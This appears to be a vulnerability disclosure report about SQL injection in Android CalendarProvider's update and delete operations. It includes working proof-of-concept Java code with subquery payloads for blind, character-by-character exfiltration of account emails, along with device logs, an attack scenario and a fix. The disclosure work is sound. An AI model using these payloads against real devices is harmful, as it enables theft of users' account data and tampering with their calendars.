# VRP Report #21: CalendarProvider Write-Path SQL Injection (Integrity + Confidentiality)

## Summary

Android's CalendarProvider (`com.android.providers.calendar`) fails to enforce `setStrict(true)` on the `selection` parameter for UPDATE and DELETE operations on the Events content URI. This allows a malicious app with `READ_CALENDAR` + `WRITE_CALENDAR` permissions to inject arbitrary SQL subqueries into write operations, enabling:

1. **Conditional modification/deletion of calendar events** based on data in internal tables the app should not be able to read
2. **Blind data exfiltration** from any table in the Calendar database via write-path side-channels
3. **Cross-table data-driven writes** — the app can use account emails, sync tokens, and schema metadata from internal tables to drive UPDATE/DELETE logic

This extends VRP Reports #16 and #20 (which proved read-path injection via projection) by proving the same vulnerability affects **write operations**, adding **INTEGRITY** impact on top of the confidentiality impact already demonstrated.

## Severity

**HIGH** — Confidentiality + Integrity impact

## Affected Component

- **Package**: `com.android.providers.calendar` (CalendarProvider)
- **URI**: `content://com.android.calendar/events`
- **Operations**: `update()` and `delete()` (selection parameter)
- **Android Version**: Android 17 (API 37), Build CP2A.260605.012
- **Device**: Pixel 6a (bluejay)

## Root Cause

`CalendarProvider.java` does not call `SQLiteQueryBuilder.setStrict(true)` for any operation — not just `query()`, but also `update()` and `delete()`. The `selection` parameter passed to these operations is incorporated directly into the SQL WHERE clause without sanitization.

Android's `setStrict(true)` blocks SQL injection through the selection parameter by rejecting subqueries, function calls, and other non-simple-expression tokens. The CalendarProvider never enables this protection for **any** code path.

This means arbitrary SQL expressions are accepted in the `selection` field of write operations:
- Subqueries: `_id=X AND (SELECT count(*) FROM Calendars)>0`
- Cross-table access: `_id=X AND (SELECT account_name FROM Calendars LIMIT 1) LIKE '%gmail%'`
- Schema enumeration: `_id=X AND (SELECT count(*) FROM sqlite_master WHERE type='table')>10`
- Character-level exfiltration: `_id=X AND unicode(substr((SELECT account_name FROM Calendars LIMIT 1),1,1))>100`

## Impact

An attacker app with `READ_CALENDAR` + `WRITE_CALENDAR` (standard runtime permissions commonly granted to calendar apps) can:

### Integrity Impact
1. **Conditionally modify events based on internal table data**: Update event titles, descriptions, or other fields only when a subquery against an internal table returns a specific result — the attacker controls which events are modified and under what conditions
2. **Conditionally delete events based on internal table data**: Delete calendar events selectively using subquery results from `sqlite_master`, `Calendars`, `_sync_state`, or any other internal table
3. **Corrupt sync state**: Potentially modify sync-related fields by chaining write operations with subquery-derived conditions

### Confidentiality Impact (via write side-channel)
4. **Blind data exfiltration through UPDATE**: By observing whether an UPDATE succeeds (modifies a row vs. doesn't), the attacker can extract data character-by-character from any internal table — including account emails, sync tokens, Google Classroom group IDs, and full database schema
5. **This is a novel exfiltration channel**: Even if projection injection (Report #20) were patched independently, the write-path side-channel would still leak data from internal tables

### Data Extracted/Proven in PoC:

| Operation | Subquery | Result | Impact |
|-----------|----------|--------|--------|
| UPDATE | `(SELECT count(*) FROM Calendars)>0` | 1 row modified — title changed to "SQLI_PROVED_WRITE" | Subquery execution confirmed |
| UPDATE | `(SELECT account_name FROM Calendars LIMIT 1) LIKE '%gmail%'` | 1 row modified — title changed to "SQLI_CROSS_TABLE_WRITE" | Cross-table data drives write logic |
| DELETE | `(SELECT count(*) FROM sqlite_master WHERE type='table')>10` | 1 row deleted (event _id=215) | Schema metadata drives deletion |
| UPDATE | `unicode(substr((SELECT account_name FROM Calendars LIMIT 1),1,1))>100` | Title set to "EXFIL_HI" (char 's'=115 > 100) | Blind exfiltration via write side-channel |

## Proof of Concept

### PoC App: `CalendarWriteInjActivity.java`

Installed on Pixel 6a as `com.vrp.poc`. The app declares `READ_CALENDAR` and `WRITE_CALENDAR` permissions only.

```java
// Step 2: Prove subquery executes in UPDATE selection
ContentValues cv = new ContentValues();
cv.put("title", "SQLI_PROVED_WRITE");
int rows = getContentResolver().update(
    Uri.parse("content://com.android.calendar/events"),
    cv,
    "_id=" + testEventId + " AND (SELECT count(*) FROM Calendars)>0",
    null
);
// Returns: 1 row modified — subquery was evaluated

// Step 3: Cross-table conditional UPDATE
cv.put("title", "SQLI_CROSS_TABLE_WRITE");
rows = getContentResolver().update(
    Uri.parse("content://com.android.calendar/events"),
    cv,
    "_id=" + testEventId + " AND (SELECT account_name FROM Calendars LIMIT 1) LIKE '%gmail%'",
    null
);
// Returns: 1 row modified — account email from Calendars table drove the condition

// Step 4: DELETE with subquery against sqlite_master
rows = getContentResolver().delete(
    Uri.parse("content://com.android.calendar/events"),
    "_id=" + sacrificialId + " AND (SELECT count(*) FROM sqlite_master WHERE type='table')>10",
    null
);
// Returns: 1 row deleted — 15 tables > 10, condition was TRUE

// Step 5: Blind exfiltration via UPDATE side-channel
cv.put("title", "EXFIL_HI");
rows = getContentResolver().update(
    Uri.parse("content://com.android.calendar/events"),
    cv,
    "_id=" + testEventId + " AND unicode(substr((SELECT account_name FROM Calendars LIMIT 1),1,1))>100",
    null
);
// Returns: 1 row modified — first char of account is 's' (unicode 115 > 100)
```

### Dynamic Proof (logcat output from device):

```
CalWriteInj: === PROVING SQL INJECTION EXECUTION IN WRITE OPERATIONS ===
CalWriteInj: --- Step 1: Find a test event ---
CalWriteInj:   Found event _id=2 title=New Year's Day
CalWriteInj: --- Step 2: Prove subquery executes in UPDATE ---
CalWriteInj:   Updating event where _id matches AND internal table count > 0
CalWriteInj:   UPDATE returned: 1 rows
CalWriteInj:   New title: SQLI_PROVED_WRITE
CalWriteInj:   *** CONFIRMED: Subquery in UPDATE selection EXECUTED ***
CalWriteInj:   *** The (SELECT count(*) FROM Calendars) was evaluated ***
CalWriteInj: --- Step 3: Cross-table conditional update ---
CalWriteInj:   Cross-table conditional UPDATE: 1 rows
CalWriteInj:   Title: SQLI_CROSS_TABLE_WRITE
CalWriteInj:   *** CONFIRMED: Cross-table subquery drives UPDATE logic ***
CalWriteInj: --- Step 4: Prove subquery in DELETE ---
CalWriteInj:   Created sacrificial event _id=215
CalWriteInj:   DELETE with subquery: 1 rows deleted
CalWriteInj:   Post-delete query: 0 rows
CalWriteInj:   *** CONFIRMED: Subquery in DELETE executed ***
CalWriteInj:   *** Condition checked sqlite_master table count > 10 ***
CalWriteInj:   *** (15 tables exist > 10, so condition was TRUE) ***
CalWriteInj: --- Step 5: Data exfiltration via UPDATE side-channel ---
CalWriteInj:   Title after conditional: EXFIL_HI
CalWriteInj:   *** Account email first char unicode > 100 (confirmed: 's' = 115) ***
CalWriteInj:   *** WRITE-PATH BLIND SQL INJECTION for data exfiltration PROVED ***
CalWriteInj: --- Step 6: Cleanup ---
CalWriteInj:   Restored original title
CalWriteInj: === CALENDAR WRITE-PATH SQL INJECTION TESTS COMPLETE ===
```

## Comparison with Other Providers

| Provider | UPDATE/DELETE Selection Protected | Query Projection Protected | Query Selection Protected |
|----------|----------------------------------|---------------------------|--------------------------|
| **CalendarProvider** | **NO** — subqueries execute | **NO** (Report #20) | **NO** (Report #16) |
| ContactsProvider | YES — `setStrict(true)` | YES | NO — blind boolean only |
| CallLogProvider | YES — validates columns | YES | NO — blind boolean only |
| MediaStore | YES — "Invalid token SELECT" | YES | YES |
| SettingsProvider | YES | YES | YES |
| MmsProvider | YES | YES | YES |

CalendarProvider is the **only** tested AOSP provider on Android 17 that allows SQL injection in **all three** code paths: query projection, query selection, and write-path selection.

## Attack Scenario

1. Attacker publishes a calendar management app that requests `READ_CALENDAR` + `WRITE_CALENDAR`
2. User grants both permissions (standard runtime permissions, commonly granted to calendar apps)
3. App silently performs blind exfiltration via write side-channel:
   - Binary search on each character of `(SELECT account_name FROM Calendars LIMIT 1)` using `unicode(substr(...,N,1))>X` in UPDATE selection
   - Each iteration modifies and reads back a title to determine if the condition was true/false
   - Full account email extracted in ~8 queries per character × email length
4. App can also corrupt calendar data conditionally:
   - Delete events matching specific criteria in internal tables
   - Modify event data based on sync state or account membership
5. No user interaction required beyond the initial permission grants
6. Write side-channel exfiltration is indistinguishable from normal calendar operations

## Novel Aspect: Write-Path Side-Channel

Unlike Report #20 (which demonstrates direct data extraction via projection), this write-path vulnerability provides a **side-channel for data exfiltration**:

- The attacker **modifies** a known event's title based on a boolean condition derived from a subquery
- The attacker then **reads** the title back to determine whether the condition was true
- By iterating with binary search (`unicode(substr(...))>X`), the full contents of any column in any table can be extracted character-by-character

This side-channel would remain exploitable even if the projection injection (Report #20) were patched independently, because the write path uses a completely separate code path in CalendarProvider.

## Recommended Fix

Add `setStrict(true)` to the `SQLiteQueryBuilder` instance used for **all** CalendarProvider operations — query, update, delete, and insert — matching the protection already applied by ContactsProvider, CallLogProvider, MediaStore, and MmsProvider:

```java
SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
qb.setStrict(true);  // Block SQL injection in selection for ALL operations
```

This single change blocks subqueries, function calls, and other injection payloads in both the projection and selection parameters across all content provider operations.

## Relationship to Reports #16 and #20

| Report | Vector | Operations | Data Flow | Impact |
|--------|--------|-----------|-----------|--------|
| #16 | Projection injection on syncstate URI | query() | Direct read | Confidentiality |
| #20 | Projection injection on Events URI, cross-table extraction | query() | Direct read | Confidentiality |
| **#21 (this)** | **Selection injection on Events URI in write operations** | **update(), delete()** | **Side-channel via write+read** | **Confidentiality + Integrity** |

This report proves the vulnerability is **systemic across all CalendarProvider operations**, not limited to read-path projection. The write-path injection adds integrity impact and provides an alternative exfiltration channel that would survive a projection-only fix.

## Test Environment

- **Device**: Pixel 6a (bluejay)
- **Android**: 17 (API 37)
- **Build**: CP2A.260605.012
- **Security Patch**: 2025-06-05
- **PoC App**: com.vrp.poc
- **PoC Activity**: CalendarWriteInjActivity
- **Permissions**: READ_CALENDAR + WRITE_CALENDAR (granted=true)
- **ADB ID**: 26131JEGR04733
